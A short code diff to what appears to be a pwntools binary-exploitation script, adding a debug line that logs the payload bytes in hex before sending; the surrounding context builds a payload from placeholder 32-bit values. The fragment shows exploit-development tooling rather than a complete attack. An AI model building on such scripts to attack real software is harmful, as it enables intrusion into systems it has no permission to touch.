@@ -61,6 +61,9 @@ def exploit(binary_path):
             payload += p32(0xdeadbeef)
             payload += p32(0xcafebabe)
             payload += p32(0xd00df00d)
+        
+        # Print the payload in hexadecimal representation for debugging purposes
+        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
         # Send the payload and print the output
         io.sendline(payload)
